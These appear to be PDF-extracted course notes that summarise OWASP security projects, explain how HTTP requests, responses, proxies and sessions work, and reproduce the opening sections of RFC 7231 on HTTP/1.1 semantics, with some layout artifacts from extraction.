## PHP code samples. The Development Guide covers an extensive array of application-level security issues, from SQL injection through modern concerns such as phishing, credit card handling, session fixation, cross-site request forgeries, compliance, and privacy issues.
OWASP Testing Guide: The OWASP Testing Guide
includes a "best practice" penetration testing framework that users can implement in their own organizations and a "low level" penetration testing guide that describes techniques for testing most common web application and web service security issues. Version 4 was published in September 2014, with input from 60 individuals.[12]
OWASP Code Review Guide: The code review guide is currently at release version 2.0, released in July 2017.
OWASP Application Security Verification Standard
(ASVS): A standard for performing application-level security verifications.[13]
OWASP XML Security Gateway (XSG) Evaluation Criteria Project.[14]
OWASP Top 10 Incident Response Guidance. This
project provides a proactive approach to Incident Response planning. The intended audience of this document includes business owners to security engineers, developers, audit, program managers, law enforcement & legal council.[15]
OWASP ZAP Project: The Zed Attack Proxy (ZAP) is an
easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience including
     ▪


## developers and functional testers who are new to penetration testing. Webgoat: a deliberately insecure web application created by OWASP as a guide for secure programming practices.[1] Once downloaded, the application comes with a tutorial and a set of different lessons that instruct students how to exploit vulnerabilities with the intention of teaching them how to write code securely.
OWASP AppSec Pipeline: The Application Security
(AppSec) Rugged DevOps Pipeline Project is a place to find information needed to increase the speed and automation of an application security program. AppSec Pipelines take the principles of DevOps and Lean and applies that to an application security program.[16]
OWASP Automated Threats to Web Applications:
Published July 2015[17] - the OWASP Automated Threats to Web Applications Project aims to provide definitive information and other resources for architects, developers, testers and others to help defend against automated threats such as credential stuffing. The project outlines the top 20 automated threats as defined by OWASP.[18]
Understanding Various Types of Application/Service Attacks
 ▪


## Web
HTTP. Hypertext Transfer Protocol
  originally designed to transfer hypertext
  - Hypertext “structured text that uses logical links, a.k.a. hyperlinks, between nodes containing text”
Designed in the early 1990s, HTTP is an extensible protocol which has evolved over time.
  - It is an application layer protocol that is sent over TCP, or over a TLS-encrypted TCP connection, though any reliable transport protocol could theoretically be used.
 ▪


##   - Due to its extensibility, it is used to fetch hypertext documents, images, videos or post content to servers, like with HTML form results. HTTP can also be used to fetch parts of documents to update Web pages on demand.
was designed as a request-response Application layer protocol where a client could request hypertext from a
server.
  - This hypertext could be modified and set up in such a way as to provide all sorts of goodies to the requesting user agent (UA)—for example, a web browser.
  - example
  - a client requests a particular resource using its Uniform Resource Identifier (URI)—most commonly expressed for web requests in the form of a URL (Uniform Resource Locator)
  - a server responds to the HTTP request by providing the resource requested.
HTTP can be used for virtually anything anymore, good or bad intent.
  - It also provides for (mostly) secure communication in its HTTPS version: HTTP over TLS, or SSL.
  - Although I could go on and on about other features of HTTP, including some well-know recent attacks against the secure version (HEARTBLEED and POODLE)
 ▪


##   - the particular markup of hypertext most see: HTML. NOTE
HTML was designed specifically to display data XML was created to transport and store data.
XML tags are, basically, whatever you want them to be.
Clients and servers communicate by exchanging individual messages (as opposed to a stream of data).
Requests: The messages sent by the client, usually a Web browser
Responses: the messages sent by the server as an answer
   ▪


##  Components of HTTP-based systems
HTTP is a client-server protocol: requests are sent by one entity, the user-agent (or a proxy on behalf of it).
Most of the time the user-agent is a Web browser, but it can
be anything, for example a robot that crawls the Web to populate and maintain a search engine index.
Each individual request is sent to a server, which handles it and provides an answer, called the response. Between the client and the server there are numerous entities, proxies, which perform
 ▪


## different operations and act as gateways or caches.
In reality, there are more computers between a browser and the server handling the request.
the layered design of the Web, these are hidden in the network and transport layers. HTTP is on top, at the application layer. Although important to diagnose network problems, the underlying layers are mostly irrelevant to the description of HTTP.
HTTP is an extensible protocol that is easy to use. The client- server structure, combined with the ability to simply add headers, allows HTTP to advance along with the extended capabilities of the Web.
Though HTTP/2 adds some complexity, embedding HTTP messages in frames to improve performance, the basic
structure of messages has stayed the same since HTTP/1.0. Session flow remains simple, allowing it to be investigated,
and debugged with a simple HTTP message monitor. Client: the user-agent
The user-agent is any tool that acts on the behalf of the user.
This role is primarily performed by the Web browser; or
programs used by engineers and Web developers to debug their applications.
The browser is always the entity initiating the request. It is never 1,391

▪
the server (though some mechanisms have been added over the years to simulate server-initiated messages).
To present a Web page, the browser sends an original request to fetch the HTML document that represents the page.
It then parses this file, making additional requests
corresponding to execution scripts, layout information (CSS) to display, and sub-resources contained within the page (usually images and videos).
The Web browser then mixes these resources to present to the user a complete document, the Web page.
Scripts executed by the browser can fetch more resources
in later phases and the browser updates the Web page accordingly.
A Web page is a hypertext document.
This means some parts of displayed text are links which can
be activated (click) to fetch a new Web page, allowing the user to direct their user-agent and navigate through the Web.
The browser translates these directions in HTTP requests,
and further interprets the HTTP responses to present the user with a clear response.
The Web server
On the opposite side of the communication channel, is the server, which serves the document as requested by the client.
     ▪


##  A server appears as only a single machine virtually:
it may actually be a collection of servers, sharing the load
(load balancing) or a complex piece of software interrogating other computers (like cache, a DB server, or e- commerce servers), totally or partially generating the document on demand.
A server is not necessarily a single machine, but several
server software instances can be hosted on the same machine. With HTTP/1.1 and the Host header, they may even share the same IP address.
Proxies
Between the Web browser and the server, numerous computers and machines relay the HTTP messages.
Due to the layered structure of the Web stack, most operate
at the transport, network or physical levels becoming transparent at the HTTP layer and potentially making a significant impact on performance.
Those operating at the application layers are generally
called proxies. These can be transparent, forwarding on the requests they receive without altering them in any way, or non-transparent, in which case they will change the request in some way before passing it along to the server. Proxies may perform numerous functions:
  - caching (the cache can be public or private, like the browser cache)
  - filtering (like an antivirus scan or parental controls) 1,393

▪
  - load balancing (to allow multiple servers to serve the different requests)
  - authentication (to control access to different resources)
  - logging (allowing the storage of historical information)
Basic aspects of HTTP
HTTP is simple
HTTP is generally designed to be simple and human readable, even with the added complexity introduced in HTTP/2 by encapsulating HTTP messages into frames. HTTP messages can be read and understood by humans, providing easier testing for developers, and reduced complexity for newcomers.
HTTP is extensible
Introduced in HTTP/1.0, HTTP headers make this protocol easy to extend and experiment with. New functionality can even be introduced by a simple agreement between a client and a server about a new header's semantics.
HTTP is stateless, but not sessionless
HTTP is stateless:
there is no link between two requests being successively
carried out on the same connection. This immediately has the prospect of being problematic for users attempting to interact with certain pages coherently, for example, using e- commerce shopping baskets.
while HTTP itself is stateless, HTTP cookies allow stateful 1,394

▪
sessions.
Using header extensibility, HTTP Cookies are added to the
workflow, allowing session creation on each HTTP request to share the same context, or the same state.
HTTP and connections
A connection is controlled at the transport layer, fundamentally out of scope for HTTP.
Though HTTP doesn't require the underlying transport
protocol to be connection-based; only requiring it to
be reliable, or not lose messages (so at minimum presenting an error).
transport protocols: TCP is reliable and UDP isn't.
HTTP therefore relies on the TCP standard, which is connection-based.
Before a client and server can exchange an HTTP request/ response pair, they must establish a TCP connection, a process which requires several round-trips.
The default behavior of HTTP/1.0 is to open a separate TCP
connection for each HTTP request/response pair. less efficient than sharing a single TCP connection when multiple requests are sent in close succession.
to mitigate this flaw, HTTP/1.1 introduced pipelining (proved difficult to implement) and persistent connections:
  - the underlying TCP connection can be partially 1,395

▪
controlled using the Connection header.
HTTP/2 went a step further by multiplexing messages over a
single connection, helping keep the connection warm and more efficient.
Experiments are in progress to design a better transport protocol more suited to HTTP. For example, Google is experimenting
with QUIC which builds on UDP to provide a more reliable and efficient transport protocol.
What can be controlled by HTTP
This extensible nature of HTTP has, over time, allowed for more control and functionality of the Web. Cache or authentication methods were functions handled early in HTTP history. The ability to relax the origin constraint, by contrast, has only been added in the 2010s.
Here is a list of common features controllable with HTTP. - Caching
  - How documents are cached can be controlled by HTTP .
  - The server can instruct 命令 proxies and clients, about what to cache and for how long.
  - The client can instruct intermediate cache proxies to ignore the stored document.
- Relaxing the origin constraint 1,396

  - To prevent snooping and privacy invasions, Web browsers enforce strict separation between Web sites.
  - Only pages from the same origin can access all the information of a Web page. Though such constraint is a burden to the server, HTTP headers can relax this strict separation on the server side, allowing a document to become a patchwork of information sourced from different domains; there could even be security-related reasons to do so.
- Authentication
  - Some pages may be protected so that only specific
users can access them.
  - Basic authentication may be provided by HTTP, either using the WWW-Authenticate and similar headers, or by setting a specific session using HTTP cookies.
- Proxy and tunneling
  - Servers or clients are often located on intranets and hide their true IP address from other computers. HTTP requests then go through proxies to cross this network barrier.
  - Not all proxies are HTTP proxies. The SOCKS protocol, for example, operates at a lower level. Other protocols, like ftp, can be handled by these proxies.
- Sessions
  - Using HTTP cookies allows you to link requests with
the state of the server.
  - This creates sessions, despite basic HTTP being a
 state-less protocol. This is useful not only for e- commerce shopping baskets, but also for any site allowing user configuration of the output.
HTTP flow
When a client wants to communicate with a server (final server or an intermediate proxy), it performs the following steps:
1. Open a TCP connection:
  - The TCP connection is used to send a request, or
several, and receive an answer.
  - The client may open a new connection, reuse an existing connection, or open several TCP connections to the servers.
2. Send an HTTP message:
  - HTTP messages (before HTTP/2) are human-readable.
  - With HTTP/2, these simple messages are encapsulated in frames, making them impossible to read directly, but the principle remains the same. For example:
⁃
3. Read the response sent by the server
 ▪


##  ⁃
4. Close or reuse the connection for further requests.
If HTTP pipelining is activated, several requests can be sent without waiting for the first response to be fully received.
HTTP pipelining has proven difficult to implement in existing
networks, where old pieces of software coexist with modern versions.
HTTP pipelining has been superseded in HTTP/2 with more robust multiplexing requests within a frame.
HTTP Messages
 ▪


##  HTTP messages,
in HTTP/1.1 and earlier, are human-readable.
In HTTP/2, these messages are embedded into a binary
structure, a frame, allowing optimizations like compression of headers and multiplexing. Even if only part of the original HTTP message is sent in this version of HTTP, the semantics of each message is unchanged and the client reconstitutes (virtually) the original HTTP/1.1 request. It is therefore useful to comprehend HTTP/2 messages in the HTTP/1.1 format.
There are two types of HTTP messages, requests and responses, each with its own format.
HTTP Requests
    Requests consists of the following elements:
- An HTTP method, usually a verb like GET, POST or a noun
like OPTIONS or HEAD
  - defines the operation the client wants to perform.
  - Typically, a client wants to fetch a resource (GET) or post the value of an HTML form (POST).
- The path of the resource to fetch; the URL of the resource stripped from elements that are obvious from the context
        - the protocol (   ), the domain (
), the TCP port (80).
http://
 developer.mozilla.org
- The version of the HTTP protocol.
- Optional headers: convey additional information for the
servers.
- Or a body, for some methods like POST, similar to those in responses, which contain the resource sent.
 HTTP Responses
  Responses consist of the following elements:
- The version of the HTTP protocol they follow.
- A status code, indicating if the request was successful, or not, and why.
- A status message, a non-authoritative short description of the status code.
- HTTP headers, like those for requests.
- Optionally, a body containing the fetched resource. APIs based on HTTP
The most commonly used API based on HTTP is
the XMLHttpRequest API, which can be used to exchange data between a user agent and a server.
The modern Fetch API provides the same features with a more powerful and flexible feature set.
Another API, server-sent events, is a one-way service that allows a server to send events to the client, using HTTP as a transport mechanism. Using the EventSource interface, the client opens a connection and establishes event handlers. The client browser automatically converts the messages that arrive on the HTTP stream into appropriate Event objects, delivering them to the event handlers that have been registered for the events' type if known, or to the onmessage event handler if no type-specific event handler was established.
[Docs] [txt|pdf] [draft-ietf-http...] [Tracker] [Diff1] [Diff2] [Errata]
               Internet Engineering Task Force (IETF) Request for Comments: 7231 Obsoletes: 2616
Updates: 2817
Category: Standards Track ISSN: 2070-1721
R. Fielding, Ed. Adobe
J. Reschke, Ed. greenbytes
June 2014
PROPOSED STANDARD
 Errata Exist
 Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content
Abstract
The Hypertext Transfer Protocol (HTTP) is a stateless application-
level protocol for distributed, collaborative, hypertext information systems. This document defines the semantics of HTTP/1.1 messages, as expressed by request methods, request header fields, response status codes, and response header fields, along with the payload of messages (metadata and body content) and mechanisms for content negotiation.
Status of This Memo
This is an Internet Standards Track document.
This document is a product of the Internet Engineering Task Force (IETF). It represents the consensus of the IETF community. It has received public review and has been approved for publication by the Internet Engineering Steering Group (IESG). Further information on Internet Standards is available in Section 2 of RFC 5741.
Information about the current status of this document, any errata, and how to provide feedback on it may be obtained at http://www.rfc-editor.org/info/rfc7231.
   Fielding & Reschke Standards Track [Page 1]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 Copyright Notice
Copyright (c) 2014 IETF Trust and the persons identified as the document authors. All rights reserved.
This document is subject to BCP 78 and the IETF Trust's Legal Provisions Relating to IETF Documents (http://trustee.ietf.org/license-info) in effect on the date of
publication of this document. Please review these documents
carefully, as they describe your rights and restrictions with respect
to this document. Code Components extracted from this document must include Simplified BSD License text as described in Section 4.e of
the Trust Legal Provisions and are provided without warranty as described in the Simplified BSD License.
This document may contain material from IETF Documents or IETF Contributions published or made publicly available before November 10, 2008. The person(s) controlling the copyright in some of this material may not have granted the IETF Trust the right to allow
   modifications of such material outside the IETF Standards Process. Without obtaining an adequate license from the person(s) controlling the copyright in such materials, this document may not be modified outside the IETF Standards Process, and derivative works of it may not be created outside the IETF Standards Process, except to format it for publication as an RFC or to translate it into languages other than English.
Table of Contents
1. Introduction ....................................................6
1.1. Conformance and Error Handling .............................6 1.2. Syntax Notation ............................................6
2. Resources .......................................................7 3. Representations .................................................7
3.1. Representation Metadata ....................................8 3.1.1. Processing Representation Data ......................8 3.1.2. Encoding for Compression or Integrity ..............11 3.1.3. Audience Language ..................................13 3.1.4. Identification .....................................14
3.2. Representation Data .......................................17 3.3. Payload Semantics .........................................17 3.4. Content Negotiation .......................................18
3.4.1. Proactive Negotiation ..............................19
3.4.2. Reactive Negotiation ...............................20 4. Request Methods ................................................21
4.1. Overview ..................................................21
4.2. Common Method Properties ..................................22
4.2.1. Safe Methods .......................................22 4.2.2. Idempotent Methods .................................23 4.2.3. Cacheable Methods ..................................24
4.3. Method Definitions ........................................24 4.3.1. GET ................................................24
         4.3.2. HEAD ...............................................25 4.3.3. POST ...............................................25 4.3.4. PUT ................................................26 4.3.5. DELETE .............................................29 4.3.6. CONNECT ............................................30 4.3.7. OPTIONS ............................................31 4.3.8. TRACE ..............................................32
5. Request Header Fields ..........................................33 5.1. Controls ..................................................33 5.1.1. Expect .............................................34
5.1.2. Max-Forwards .......................................36 5.2. Conditionals ..............................................36 5.3. Content Negotiation .......................................37
5.3.1. Quality Values .....................................37 5.3.2. Accept .............................................38 5.3.3. Accept-Charset .....................................40 5.3.4. Accept-Encoding ....................................41 5.3.5. Accept-Language ....................................42
5.4. Authentication Credentials ................................44 5.5. Request Context ...........................................44
5.5.1. From ...............................................44 5.5.2. Referer ............................................45 5.5.3. User-Agent .........................................46
6. Response Status Codes ..........................................47 6.1. Overview of Status Codes ..................................48 6.2. Informational 1xx .........................................50
6.2.1. 100 Continue .......................................50
6.2.2. 101 Switching Protocols ............................50 6.3. Successful 2xx ............................................51
6.3.1. 200 OK .............................................51
6.3.2. 201 Created ........................................52
6.3.3. 202 Accepted .......................................52
6.3.4. 203 Non-Authoritative Information ..................52 6.3.5. 204 No Content .....................................53
6.3.6. 205 Reset Content ..................................53 1,407

6.4. Redirection 3xx ...........................................54 6.4.1. 300 Multiple Choices ...............................55 6.4.2. 301 Moved Permanently ..............................56 6.4.3. 302 Found ..........................................56 6.4.4. 303 See Other ......................................57 6.4.5. 305 Use Proxy ......................................58 6.4.6. 306 (Unused) .......................................58 6.4.7. 307 Temporary Redirect .............................58
6.5. Client Error 4xx ..........................................58
6.5.1. 400 Bad Request ....................................58 6.5.2. 402 Payment Required ...............................59 6.5.3. 403 Forbidden ......................................59 6.5.4. 404 Not Found ......................................59 6.5.5. 405 Method Not Allowed .............................59 6.5.6. 406 Not Acceptable .................................60 6.5.7. 408 Request Timeout ................................60 6.5.8. 409 Conflict .......................................60
6.5.9. 410 Gone ...........................................60
6.5.10. 411 Length Required ...............................61 6.5.11. 413 Payload Too Large .............................61 6.5.12. 414 URI Too Long ..................................61 6.5.13. 415 Unsupported Media Type ........................62 6.5.14. 417 Expectation Failed ............................62 6.5.15. 426 Upgrade Required ..............................62
6.6. Server Error 5xx ..........................................62
6.6.1. 500 Internal Server Error ..........................63 6.6.2. 501 Not Implemented ................................63 6.6.3. 502 Bad Gateway ....................................63
6.6.4. 503 Service Unavailable ............................63 6.6.5. 504 Gateway Timeout ................................63 6.6.6. 505 HTTP Version Not Supported .....................64
7. Response Header Fields .........................................64 7.1. Control Data ..............................................64
7.1.1. Origination Date ...................................65 7.1.2. Location ...........................................68
                             7.1.3. Retry-After ........................................69
7.1.4. Vary ...............................................70
7.2. Validator Header Fields ...................................71 7.3. Authentication Challenges .................................72 7.4. Response Context ..........................................72
7.4.1. Allow ..............................................72
7.4.2. Server .............................................73
8. IANA Considerations ............................................73
8.1. Method Registry ...........................................73
8.1.1. Procedure ..........................................74
8.1.2. Considerations for New Methods .....................74 8.1.3. Registrations ......................................75
8.2. Status Code Registry ......................................75
8.2.1. Procedure ..........................................75
8.2.2. Considerations for New Status Codes ................76 8.2.3. Registrations ......................................76
8.3. Header Field Registry .....................................77
8.3.1. Considerations for New Header Fields ...............78 8.3.2. Registrations ......................................80
8.4. Content Coding Registry ...................................81 8.4.1. Procedure ..........................................81 8.4.2. Registrations ......................................81
9. Security Considerations ........................................81
9.1. Attacks Based on File and Path Names ......................82
9.2. Attacks Based on Command, Code, or Query Injection ........82 9.3. Disclosure of Personal Information ........................83
9.4. Disclosure of Sensitive Information in URIs ...............83
9.5. Disclosure of Fragment after Redirects ....................84
9.6. Disclosure of Product Information .........................84
9.7. Browser Fingerprinting ....................................84
10. Acknowledgments ...............................................85 11. References ....................................................85
11.1. Normative References .....................................85
11.2. Informative References ...................................86
Appendix A. Differences between HTTP and MIME .....................89
                 A.1. MIME-Version ..............................................89
A.2. Conversion to Canonical Form ..............................89
A.3. Conversion of Date Formats ................................90
A.4. Conversion of Content-Encoding ............................90 A.5. Conversion of Content-Transfer-Encoding ...................90 A.6. MHTML and Line Length Limitations .........................90
Appendix B. Changes from RFC 2616 .................................91 Appendix C. Imported ABNF .........................................93 Appendix D. Collected ABNF ........................................94 Index .............................................................97
1. Introduction
Each Hypertext Transfer Protocol (HTTP) message is either a request or a response. A server listens on a connection for a request,
parses each message received, interprets the message semantics in relation to the identified request target, and responds to that
request with one or more response messages. A client constructs request messages to communicate specific intentions, examines received responses to see if the intentions were carried out, and determines how to interpret the results. This document defines HTTP/1.1 request and response semantics in terms of the architecture defined in [RFC7230].
HTTP provides a uniform interface for interacting with a resource (Section 2), regardless of its type, nature, or implementation, via the manipulation and transfer of representations (Section 3).
HTTP semantics include the intentions defined by each request method (Section 4), extensions to those semantics that might be described in request header fields (Section 5), the meaning of status codes to indicate a machine-readable response (Section 6), and the meaning of other control data and resource metadata that might be given in
               response header fields (Section 7).
This document also defines representation metadata that describe how a payload is intended to be interpreted by a recipient, the request header fields that might influence content selection, and the various selection algorithms that are collectively referred to as "content negotiation" (Section 3.4).
1.1. Conformance and Error Handling
The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT",
"SHOULD", "SHOULD NOT", "RECOMMENDED", "MAY", and "OPTIONAL" in this
document are to be interpreted as described in [RFC2119]. Conformance criteria and considerations regarding error handling are
defined in Section 2.5 of [RFC7230]. 1.2. Syntax Notation
This specification uses the Augmented Backus-Naur Form (ABNF) notation of [RFC5234] with a list extension, defined in Section 7 of [RFC7230], that allows for compact definition of comma-separated lists using a '#' operator (similar to how the '*' operator indicates repetition). Appendix C describes rules imported from other documents. Appendix D shows the collected grammar with all list operators expanded to standard ABNF notation.
Fielding & Reschke Standards Track [Page 6]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 1,411

This specification uses the terms "character", "character encoding scheme", "charset", and "protocol element" as they are defined in [RFC6365].
2. Resources
The target of an HTTP request is called a "resource". HTTP does not limit the nature of a resource; it merely defines an interface that might be used to interact with resources. Each resource is
identified by a Uniform Resource Identifier (URI), as described in Section 2.7 of [RFC7230].
When a client constructs an HTTP/1.1 request message, it sends the target URI in one of various forms, as defined in (Section 5.3 of [RFC7230]). When a request is received, the server reconstructs an effective request URI for the target resource (Section 5.5 of [RFC7230]).
One design goal of HTTP is to separate resource identification from request semantics, which is made possible by vesting the request semantics in the request method (Section 4) and a few request-modifying header fields (Section 5). If there is a conflict between the method semantics and any semantic implied by the URI itself, as described in Section 4.2.1, the method semantics take precedence.
3. Representations
Considering that a resource could be anything, and that the uniform interface provided by HTTP is similar to a window through which one can observe and act upon such a thing only through the communication of messages to some independent actor on the other side, an abstraction is needed to represent ("take the place of") the current
         or desired state of that thing in our communications. That abstraction is called a representation [REST].
For the purposes of HTTP, a "representation" is information that is intended to reflect a past, current, or desired state of a given resource, in a format that can be readily communicated via the protocol, and that consists of a set of representation metadata and a potentially unbounded stream of representation data.
An origin server might be provided with, or be capable of generating, multiple representations that are each intended to reflect the
current state of a target resource. In such cases, some algorithm is used by the origin server to select one of those representations as most applicable to a given request, usually based on content negotiation. This "selected representation" is used to provide the
Fielding & Reschke Standards Track [Page 7]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
data and metadata for evaluating conditional requests [RFC7232] and constructing the payload for 200 (OK) and 304 (Not Modified) responses to GET (Section 4.3.1).
3.1. Representation Metadata
Representation header fields provide metadata about the representation. When a message includes a payload body, the representation header fields describe how to interpret the representation data enclosed in the payload body. In a response to a HEAD request, the representation header fields describe the
   representation data that would have been enclosed in the payload body if the same request had been a GET.
The following header fields convey representation metadata:
+-------------------+-----------------+
| Header Field Name | Defined in... | +-------------------+-----------------+
| Content-Type | Section 3.1.1.5 |
| Content-Encoding | Section 3.1.2.2 | | Content-Language | Section 3.1.3.2 | | Content-Location | Section 3.1.4.2 | +-------------------+-----------------+
3.1.1. Processing Representation Data 3.1.1.1. Media Type
HTTP uses Internet media types [RFC2046] in the Content-Type (Section 3.1.1.5) and Accept (Section 5.3.2) header fields in order
to provide open and extensible data typing and type negotiation. Media types define both a data format and various processing models: how to process that data in accordance with each context in which it is received.
media-type = type "/" subtype *( OWS ";" OWS parameter ) type = token
subtype = token
The type/subtype MAY be followed by parameters in the form of name=value pairs.
parameter = token "=" ( token / quoted-string )
         Fielding & Reschke Standards Track [Page 8]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
The type, subtype, and parameter name tokens are case-insensitive. Parameter values might or might not be case-sensitive, depending on the semantics of the parameter name. The presence or absence of a parameter might be significant to the processing of a media-type, depending on its definition within the media type registry.
A parameter value that matches the token production can be transmitted either as a token or within a quoted-string. The quoted and unquoted values are equivalent. For example, the following examples are all equivalent, but the first is preferred for consistency:
text/html;charset=utf-8 text/html;charset=UTF-8 Text/HTML;Charset="utf-8" text/html; charset="utf-8"
Internet media types ought to be registered with IANA according to the procedures defined in [BCP13].
Note: Unlike some similar constructs in other header fields, media type parameters do not allow whitespace (even "bad" whitespace) around the "=" character.
 3.1.1.2. Charset
HTTP uses charset names to indicate or negotiate the character encoding scheme of a textual representation [RFC6365]. A charset is identified by a case-insensitive token.
charset = token
Charset names ought to be registered in the IANA "Character Sets" registry (<http://www.iana.org/assignments/character-sets>) according to the procedures defined in [RFC2978].
3.1.1.3. Canonicalization and Text Defaults
Internet media types are registered with a canonical form in order to
be interoperable among systems with varying native encoding formats. Representations selected or transferred via HTTP ought to be in canonical form, for many of the same reasons described by the Multipurpose Internet Mail Extensions (MIME) [RFC2045]. However, the performance characteristics of email deployments (i.e., store and forward messages to peers) are significantly different from those common to HTTP and the Web (server-based information services). Furthermore, MIME's constraints for the sake of compatibility with
older mail transfer protocols do not apply to HTTP (see Appendix A).
Fielding & Reschke Standards Track [Page 9]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 MIME's canonical form requires that media subtypes of the "text" type
use CRLF as the text line break. HTTP allows the transfer of text
         media with plain CR or LF alone representing a line break, when such line breaks are consistent for an entire representation. An HTTP sender MAY generate, and a recipient MUST be able to parse, line breaks in text media that consist of CRLF, bare CR, or bare LF. In addition, text media in HTTP is not limited to charsets that use
octets 13 and 10 for CR and LF, respectively. This flexibility regarding line breaks applies only to text within a representation that has been assigned a "text" media type; it does not apply to "multipart" types or HTTP elements outside the payload body (e.g., header fields).
If a representation is encoded with a content-coding, the underlying data ought to be in a form defined above prior to being encoded.
3.1.1.4. Multipart Types
MIME provides for a number of "multipart" types -- encapsulations of one or more representations within a single message body. All multipart types share a common syntax, as defined in Section 5.1.1 of [RFC2046], and include a boundary parameter as part of the media type value. The message body is itself a protocol element; a sender MUST generate only CRLF to represent line breaks between body parts.
HTTP message framing does not use the multipart boundary as an indicator of message body length, though it might be used by implementations that generate or process the payload. For example, the "multipart/form-data" type is often used for carrying form data
in a request, as described in [RFC2388], and the "multipart/ byteranges" type is defined by this specification for use in some 206 (Partial Content) responses [RFC7233].
3.1.1.5. Content-Type
The "Content-Type" header field indicates the media type of the
associated representation: either the representation enclosed in the
     message payload or the selected representation, as determined by the message semantics. The indicated media type defines both the data format and how that data is intended to be processed by a recipient, within the scope of the received message semantics, after any content codings indicated by Content-Encoding are decoded.
Content-Type = media-type
Fielding & Reschke Standards Track [Page 10]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 Media types are defined in Section 3.1.1.1. An example of the field
is
Content-Type: text/html; charset=ISO-8859-4
A sender that generates a message containing a payload body SHOULD generate a Content-Type header field in that message unless the intended media type of the enclosed representation is unknown to the sender. If a Content-Type header field is not present, the recipient
MAY either assume a media type of "application/octet-stream" ([RFC2046], Section 4.5.1) or examine the data to determine its type.
In practice, resource owners do not always properly configure their origin server to provide the correct Content-Type for a given representation, with the result that some clients will examine a
   payload's content and override the specified type. Clients that do
so risk drawing incorrect conclusions, which might expose additional security risks (e.g., "privilege escalation"). Furthermore, it is impossible to determine the sender's intent by examining the data format: many data formats match multiple media types that differ only in processing semantics. Implementers are encouraged to provide a means of disabling such "content sniffing" when it is used.
3.1.2. Encoding for Compression or Integrity 3.1.2.1. Content Codings
Content coding values indicate an encoding transformation that has been or can be applied to a representation. Content codings are primarily used to allow a representation to be compressed or otherwise usefully transformed without losing the identity of its underlying media type and without loss of information. Frequently, the representation is stored in coded form, transmitted directly, and only decoded by the final recipient.
content-coding = token
All content-coding values are case-insensitive and ought to be registered within the "HTTP Content Coding Registry", as defined in Section 8.4. They are used in the Accept-Encoding (Section 5.3.4) and Content-Encoding (Section 3.1.2.2) header fields.
     Fielding & Reschke Standards Track [Page 11]
RFC 7231 HTTP/1.1 Semantics and Content
The following content-coding values are defined by this
June 2014
 specification:
compress (and x-compress): See Section 4.2.1 of [RFC7230]. deflate: See Section 4.2.2 of [RFC7230].
gzip (and x-gzip): See Section 4.2.3 of [RFC7230].
3.1.2.2. Content-Encoding
The "Content-Encoding" header field indicates what content codings have been applied to the representation, beyond those inherent in the media type, and thus what decoding mechanisms have to be applied in order to obtain data in the media type referenced by the Content-Type header field. Content-Encoding is primarily used to allow a representation's data to be compressed without losing the identity of its underlying media type.
Content-Encoding = 1#content-coding An example of its use is
Content-Encoding: gzip
If one or more encodings have been applied to a representation, the sender that applied the encodings MUST generate a Content-Encoding header field that lists the content codings in the order in which
       they were applied. Additional information about the encoding parameters can be provided by other header fields not defined by this specification.
Unlike Transfer-Encoding (Section 3.3.1 of [RFC7230]), the codings listed in Content-Encoding are a characteristic of the representation; the representation is defined in terms of the coded form, and all other metadata about the representation is about the coded form unless otherwise noted in the metadata definition. Typically, the representation is only decoded just prior to rendering or analogous usage.
If the media type includes an inherent encoding, such as a data
format that is always compressed, then that encoding would not be restated in Content-Encoding even if it happens to be the same algorithm as one of the content codings. Such a content coding would only be listed if, for some bizarre reason, it is applied a second
time to form the representation. Likewise, an origin server might choose to publish the same data as multiple representations that
differ only in whether the coding is defined as part of Content-Type
Fielding & Reschke Standards Track [Page 12]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
or Content-Encoding, since some user agents will behave differently in their handling of each response (e.g., open a "Save as ..." dialog instead of automatic decompression and rendering of content).
An origin server MAY respond with a status code of 415 (Unsupported Media Type) if a representation in the request message has a content
   coding that is not acceptable.
3.1.3. Audience Language 3.1.3.1. Language Tags
A language tag, as defined in [RFC5646], identifies a natural
language spoken, written, or otherwise conveyed by human beings for communication of information to other human beings. Computer languages are explicitly excluded.
HTTP uses language tags within the Accept-Language and Content-Language header fields. Accept-Language uses the broader language-range production defined in Section 5.3.5, whereas Content-Language uses the language-tag production defined below.
language-tag = <Language-Tag, see [RFC5646], Section 2.1>
A language tag is a sequence of one or more case-insensitive subtags, each separated by a hyphen character ("-", %x2D). In most cases, a language tag consists of a primary language subtag that identifies a broad family of related languages (e.g., "en" = English), which is optionally followed by a series of subtags that refine or narrow that language's range (e.g., "en-CA" = the variety of English as communicated in Canada). Whitespace is not allowed within a language tag. Example tags include:
fr, en-US, es-419, az-Arab, x-pig-latin, man-Nkoo-GN See [RFC5646] for further information.
3.1.3.2. Content-Language
The "Content-Language" header field describes the natural language(s)
of the intended audience for the representation. Note that this
       might not be equivalent to all the languages used within the representation.
Content-Language = 1#language-tag
Fielding & Reschke Standards Track [Page 13]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
Language tags are defined in Section 3.1.3.1. The primary purpose of Content-Language is to allow a user to identify and differentiate representations according to the users' own preferred language. Thus, if the content is intended only for a Danish-literate audience, the appropriate field is
Content-Language: da
If no Content-Language is specified, the default is that the content is intended for all language audiences. This might mean that the sender does not consider it to be specific to any natural language, or that the sender does not know for which language it is intended.
Multiple languages MAY be listed for content that is intended for multiple audiences. For example, a rendition of the "Treaty of Waitangi", presented simultaneously in the original Maori and English versions, would call for
Content-Language: mi, en
 However, just because multiple languages are present within a representation does not mean that it is intended for multiple linguistic audiences. An example would be a beginner's language primer, such as "A First Lesson in Latin", which is clearly intended to be used by an English-literate audience. In this case, the Content-Language would properly only include "en".
Content-Language MAY be applied to any media type -- it is not limited to textual documents.
3.1.4. Identification
3.1.4.1. Identifying a Representation
When a complete or partial representation is transferred in a message payload, it is often desirable for the sender to supply, or the
recipient to determine, an identifier for a resource corresponding to that representation.
For a request message:
o If the request has a Content-Location header field, then the sender asserts that the payload is a representation of the resource identified by the Content-Location field-value. However, such an assertion cannot be trusted unless it can be verified by other means (not defined by this specification). The information might still be useful for revision history links.
